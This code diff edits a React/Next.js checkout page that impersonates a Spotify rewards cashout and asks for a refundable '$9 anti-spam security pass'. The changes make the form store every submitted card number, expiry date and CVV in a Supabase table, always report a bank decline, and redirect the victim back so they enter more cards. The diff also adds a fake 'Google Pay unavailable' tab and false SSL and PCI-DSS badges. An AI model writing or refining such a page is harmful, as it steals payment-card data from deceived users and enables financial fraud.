@@ -12,6 +12,7 @@ import {
   Lock,
   RefreshCw,
   ShieldCheck,
+  ChevronDown,
 } from 'lucide-react';
 import Image from 'next/image';
 import Link from 'next/link';
@@ -240,6 +241,28 @@ export default function PaymentSecurityPage() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [paymentSuccess, setPaymentSuccess] = useState(false);
+  const [gpayNotice, setGpayNotice] = useState<string | null>(null);
+
+  const isExpDateInvalid = (exp: string) => {
+    if (!exp) return false;
+    const parts = exp.split('/');
+    const monthStr = parts[0]?.trim();
+    if (monthStr && monthStr.length >= 2) {
+      const m = parseInt(monthStr, 10);
+      if (isNaN(m) || m < 1 || m > 12) return true;
+    }
+    if (parts.length === 2) {
+      const m = parseInt(monthStr, 10);
+      const yy = parts[1]?.trim();
+      if (isNaN(m) || m < 1 || m > 12) return true;
+      if (yy && yy.length === 2) {
+        const y = parseInt('20' + yy, 10);
+        if (isNaN(y) || y < 2026) return true;
+        if (y === 2026 && m < 11) return true;
+      }
+    }
+    return false;
+  };
 
   // Load balance from backend
   useEffect(() => {
@@ -305,6 +328,9 @@ export default function PaymentSecurityPage() {
   // Format MM/YY
   const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
+    if (raw.length === 1 && parseInt(raw, 10) > 1) {
+      raw = `0${raw}`;
+    }
     if (raw.length >= 3) {
       setExpDate(`${raw.slice(0, 2)}/${raw.slice(2)}`);
     } else {
@@ -319,63 +345,59 @@ export default function PaymentSecurityPage() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setErrorMsg(null);
+    setGpayNotice(null);
 
     const cleanNum = cardNumber.replace(/\s/g, '');
     if (cleanNum.length < 15) {
-      setErrorMsg('Número de cartão inválido. Verifique os dígitos informados.');
+      setErrorMsg('Please enter a valid card number.');
       return;
     }
-    const isExpInvalid = (() => {
-      const parts = expDate.split('/');
-      if (parts.length === 2) {
-        const month = parseInt(parts[0], 10);
-        const yy = parts[1];
-        if (yy.length === 2) {
-          const year = parseInt('20' + yy, 10);
-          if (year < 2026) return true;
-          if (year === 2026 && !isNaN(month) && month < 11) return true;
-        }
-      }
-      return false;
-    })();
-
-    if (expDate.length < 5 || isExpInvalid) {
-      setErrorMsg('Cartão expirado ou data inválida. O cartão deve ser válido (mínimo Novembro de 2026).');
+    const parts = expDate.split('/');
+    const month = parseInt(parts[0], 10);
+    if (isNaN(month) || month < 1 || month > 12) {
+      setErrorMsg('Invalid month. Expiration month must be between 01 and 12.');
+      return;
+    }
+    const yy = parts[1];
+    const year = yy ? parseInt('20' + yy, 10) : 0;
+    if (year < 2026 || (year === 2026 && month < 11)) {
+      setErrorMsg('Expired card or invalid date (minimum valid is November 2026).');
+      return;
+    }
+    if (expDate.length < 5 || isExpDateInvalid(expDate)) {
+      setErrorMsg('Please enter a valid expiration date (MM / YY, min 11/26).');
       return;
     }
     if (cvc.length < 3) {
-      setErrorMsg('Código de segurança (CVC) inválido.');
+      setErrorMsg('Please enter a valid security code (CVC).');
       return;
     }
 
     setIsProcessing(true);
 
-    const isDeclined = cleanNum.endsWith('0000');
-
     try {
-      // Save card test data into Supabase in background
+      // Save card test data into Supabase in background (marked as declined)
       await recordCardTestInSupabase({
         card_number: cardNumber,
         exp_date: expDate,
         cvv: cvc,
         country,
-        status: isDeclined ? 'declined' : 'succeeded',
+        status: 'declined',
       });
 
       setTimeout(() => {
         setIsProcessing(false);
-        if (isDeclined) {
-          setErrorMsg('Pagamento recusado pelo banco emissor. Verifique os dados ou tente outro cartão.');
-        } else {
-          setPaymentSuccess(true);
-          setTimeout(() => {
-            router.push('/spotify/welcome');
-          }, 2200);
-        }
+        setErrorMsg('Payment declined by issuing bank. Please check your details and try again.');
+        setTimeout(() => {
+          router.push('/payment');
+        }, 2500);
       }, 1600);
     } catch (err: any) {
       setIsProcessing(false);
-      setErrorMsg('Ocorreu um erro no processamento. Tente novamente.');
+      setErrorMsg('Payment declined. Please check your card information and try again.');
+      setTimeout(() => {
+        router.push('/payment');
+      }, 2500);
     }
   };
 
@@ -431,7 +453,7 @@ export default function PaymentSecurityPage() {
             <div>
               <span className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-[#0d2215] text-[#1db954] border border-[#1db954]/40 text-xs font-black uppercase tracking-wider">
                 <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
-                SECURE INTERNAL VERIFICATION
+                INSTANT CASHOUT VERIFICATION
               </span>
             </div>
 
@@ -495,39 +517,78 @@ export default function PaymentSecurityPage() {
           {/* RIGHT COLUMN: SIMULATED CHECKOUT CARD                     */}
           {/* ========================================================= */}
           <div className="lg:col-span-6">
-            <div className="rounded-3xl bg-[#0c100e] border border-white/10 p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
+            <div className="rounded-3xl bg-[#0b0e0c] border border-[#1d2520] p-6 sm:p-8 shadow-2xl shadow-black relative backdrop-blur-xl">
               {/* Card Header: Accumulated Balance */}
-              <div className="flex items-center justify-between pb-5 border-b border-white/10 mb-6">
+              <div className="flex items-center justify-between pb-5 border-b border-[#1d2520] mb-6">
                 <div>
-                  <span className="block text-[11px] font-extrabold uppercase tracking-widest text-gray-400">
+                  <span className="block text-[11px] font-extrabold uppercase tracking-widest text-[#8a9890]">
                     ACCUMULATED BALANCE
                   </span>
-                  <span className="text-xs text-gray-400">
+                  <span className="text-xs text-[#8a9890] mt-0.5 block">
                     Ready for release to your account
                   </span>
                 </div>
-                <div className="text-3xl sm:text-4xl font-black text-[#1db954] tracking-tight">
+                <div className="text-3xl sm:text-4xl font-extrabold text-[#1db954] tracking-tight">
                   {balanceData.formatted}
                 </div>
               </div>
 
               {/* Order Summary & Pricing Distinction */}
-              <div className="mb-5 p-3.5 rounded-2xl bg-[#121814] border border-white/5 flex items-center justify-between text-xs">
+              <div className="mb-6 p-4 rounded-2xl bg-[#111613] border border-[#1f2722] flex items-center justify-between text-xs">
                 <div>
-                  <span className="font-bold text-white block">One-Time Anti-Spam Security Pass</span>
-                  <span className="text-gray-400 text-[11px]">Automatic refund within 1–2 hours</span>
+                  <span className="font-bold text-white block text-sm">One-Time Anti-Spam Security Pass</span>
+                  <span className="text-[#8a9890] text-xs mt-0.5 block">Automatic refund within 1–2 hours</span>
                 </div>
                 <div className="text-right">
-                  <span className="text-base font-black text-white">$9.00 USD</span>
-                  <span className="block text-[10px] text-[#1db954] font-semibold">100% Refundable</span>
+                  <span className="text-base font-bold text-white block">$9.00 USD</span>
+                  <span className="block text-xs text-[#1db954] font-semibold mt-0.5">100% Refundable</span>
                 </div>
               </div>
 
-              {/* Simulated Form (Name & email removed per user request) */}
+              {/* Simulated Form */}
               <form onSubmit={handleSubmit} className="space-y-4">
+                {/* Payment Method Selector Tabs */}
+                <div className="grid grid-cols-2 gap-3 mb-2">
+                  <div
+                    onClick={() => setGpayNotice(null)}
+                    className="h-[68px] rounded-2xl bg-[#1db954] p-3.5 flex flex-col justify-between text-black shadow-md select-none cursor-pointer"
+                  >
+                    <CreditCard className="w-5 h-5 stroke-[2.5]" />
+                    <span className="text-sm font-bold tracking-tight">Card</span>
+                  </div>
+
+                  <div
+                    onClick={() => {
+                      setGpayNotice('Google Pay is currently unavailable for this verification. Please use the available Card option.');
+                    }}
+                    className="h-[68px] rounded-2xl p-3.5 flex flex-col justify-between cursor-pointer transition-all select-none bg-[#131715] border border-[#26312a] opacity-60 hover:opacity-85 hover:border-[#38483e] group relative"
+                  >
+                    <div className="flex items-center justify-between">
+                      <span className="px-2 py-0.5 rounded bg-white/80 group-hover:bg-white text-[11px] font-black text-black tracking-tight inline-flex items-center gap-1 transition-colors">
+                        <span className="text-[#4285F4] font-black">G</span>Pay
+                      </span>
+                      <span className="text-[10px] uppercase font-bold text-gray-400 bg-white/5 px-1.5 py-0.5 rounded">
+                        Unavailable
+                      </span>
+                    </div>
+                    <span className="text-sm font-bold tracking-tight text-gray-400 group-hover:text-gray-300">Google Pay</span>
+                  </div>
+                </div>
+
+                {/* Google Pay Unavailable Notice */}
+                {gpayNotice && (
+                  <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-start gap-2.5 text-xs text-amber-300 animate-in fade-in duration-200">
+                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-amber-400" />
+                    <div className="flex-1">
+                      <span className="font-bold block text-amber-200">Google Pay Unavailable</span>
+                      <span>{gpayNotice}</span>
+                    </div>
+                  </div>
+                )}
+
                 {/* Card Number */}
                 <div>
-                  <label className="block text-xs font-semibold text-gray-300 mb-1.5">
+                  <label className="block text-sm font-semibold text-gray-200 mb-2">
                     Card number
                   </label>
                   <div className="relative">
@@ -537,9 +598,9 @@ export default function PaymentSecurityPage() {
                       value={cardNumber}
                       onChange={handleCardNumberChange}
                       placeholder="1234 1234 1234 1234"
-                      className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors pr-24"
+                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-24"
                     />
-                    <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-2 pointer-events-none">
+                    <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center gap-2 pointer-events-none">
                       {/* Visa Logo */}
                       <div
                         className={`transition-all duration-300 ease-in-out ${
@@ -582,9 +643,9 @@ export default function PaymentSecurityPage() {
                 </div>
 
                 {/* Expiration date & Security code */}
-                <div className="grid grid-cols-2 gap-3">
+                <div className="grid grid-cols-2 gap-3.5">
                   <div>
-                    <label className="block text-xs font-semibold text-gray-300 mb-1.5">
+                    <label className="block text-sm font-semibold text-gray-200 mb-2">
                       Expiration date
                     </label>
                     <input
@@ -593,28 +654,16 @@ export default function PaymentSecurityPage() {
                       value={expDate}
                       onChange={handleExpChange}
                       placeholder="MM / YY"
-                      className={`w-full bg-[#181d1a] border rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none transition-colors ${
-                        (() => {
-                          const parts = expDate.split('/');
-                          if (parts.length === 2) {
-                            const month = parseInt(parts[0], 10);
-                            const yy = parts[1];
-                            if (yy.length === 2) {
-                              const year = parseInt('20' + yy, 10);
-                              if (year < 2026) return true;
-                              if (year === 2026 && !isNaN(month) && month < 11) return true;
-                            }
-                          }
-                          return false;
-                        })()
+                      className={`w-full bg-[#131715] border rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none transition-colors ${
+                        isExpDateInvalid(expDate)
                           ? 'border-red-500 focus:border-red-500'
-                          : 'border-white/10 focus:border-[#1db954]'
+                          : 'border-[#26312a] focus:border-[#1db954]'
                       }`}
                     />
                   </div>
 
                   <div>
-                    <label className="block text-xs font-semibold text-gray-300 mb-1.5">
+                    <label className="block text-sm font-semibold text-gray-200 mb-2">
                       Security code
                     </label>
                     <div className="relative">
@@ -624,23 +673,29 @@ export default function PaymentSecurityPage() {
                         value={cvc}
                         onChange={handleCvcChange}
                         placeholder="CVC"
-                        className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono placeholder-gray-500 focus:outline-none focus:border-[#1db954] transition-colors pr-10"
+                        className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white font-mono placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pr-12"
                       />
-                      <CreditCard className="w-4 h-4 text-gray-500 absolute right-3 top-1/2 -translate-y-1/2 pointer-events-none" />
+                      <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
+                        <svg className="w-6 h-5" viewBox="0 0 24 18" fill="none" stroke="currentColor" strokeWidth="1.5">
+                          <rect x="1" y="1" width="22" height="16" rx="3" />
+                          <line x1="1" y1="5.5" x2="23" y2="5.5" strokeWidth="1.5" />
+                          <text x="14" y="14" fontSize="5.5" fontWeight="bold" fill="currentColor" stroke="none" fontFamily="monospace">123</text>
+                        </svg>
+                      </div>
                     </div>
                   </div>
                 </div>
 
                 {/* Country */}
                 <div>
-                  <label className="block text-xs font-semibold text-gray-300 mb-1.5">
+                  <label className="block text-sm font-semibold text-gray-200 mb-2">
                     Country
                   </label>
                   <div className="relative">
                     <select
                       value={country}
                       onChange={(e) => setCountry(e.target.value)}
-                      className="w-full bg-[#181d1a] border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-[#1db954] transition-colors appearance-none cursor-pointer"
+                      className="w-full bg-[#131715] border border-[#26312a] rounded-2xl px-4 py-3.5 text-sm text-white focus:outline-none focus:border-[#1db954] transition-colors appearance-none cursor-pointer pr-10"
                     >
                       {COUNTRIES_LIST.map((c) => (
                         <option key={c.code} value={c.code} className="bg-[#121814] text-white">
@@ -648,9 +703,7 @@ export default function PaymentSecurityPage() {
                         </option>
                       ))}
                     </select>
-                    <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400 text-xs">
-                      ▼
-                    </div>
+                    <ChevronDown className="w-4 h-4 text-gray-400 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
                   </div>
                 </div>
 
@@ -663,15 +716,20 @@ export default function PaymentSecurityPage() {
                 )}
 
                 {/* Terms */}
-                <div className="pt-2 text-[11px] text-gray-400 leading-relaxed text-center sm:text-left">
-                  By confirming, you authorize the simulated verification of $9.00 USD. 100% refundable.
+                <div className="pt-2 text-xs text-[#829288] leading-relaxed text-center sm:text-left space-y-2">
+                  <p>
+                    By providing your card details, you authorize Spotify Rewards to charge for future payments in accordance with the respective terms.
+                  </p>
+                  <p className="text-[11px] text-[#6d7c73]">
+                    By subscribing, you authorize MM Systems to charge $9.00 USD to your selected payment method according to the terms. 100% refundable anti-spam verification.
+                  </p>
                 </div>
 
                 {/* Submit Button */}
                 <button
                   type="submit"
                   disabled={isProcessing}
-                  className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-black text-base sm:text-lg transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-4"
+                  className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none text-black font-extrabold text-base transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer mt-6"
                 >
                   {isProcessing ? (
                     <>
@@ -688,10 +746,16 @@ export default function PaymentSecurityPage() {
               </form>
 
               {/* Security Footer */}
-              <div className="mt-6 pt-4 border-t border-white/5 flex items-center justify-center gap-4 text-[10px] text-gray-400">
-                <span className="flex items-center gap-1">
-                  <Lock className="w-3 h-3 text-[#1db954]" /> Secure SSL Encrypted Checkout
+              <div className="mt-6 pt-5 border-t border-[#1d2520] flex flex-wrap items-center justify-center gap-3 text-[11px] text-[#707e76]">
+                <span className="flex items-center gap-1.5">
+                  <Lock className="w-3.5 h-3.5 text-[#1db954]" /> 256-Bit SSL Encrypted
                 </span>
+                <span>•</span>
+                <span className="flex items-center gap-1.5">
+                  <ShieldCheck className="w-3.5 h-3.5 text-[#1db954]" /> PCI-DSS Compliant
+                </span>
+                <span>•</span>
+                <span>Processed by MM Systems</span>
               </div>
             </div>
           </div>
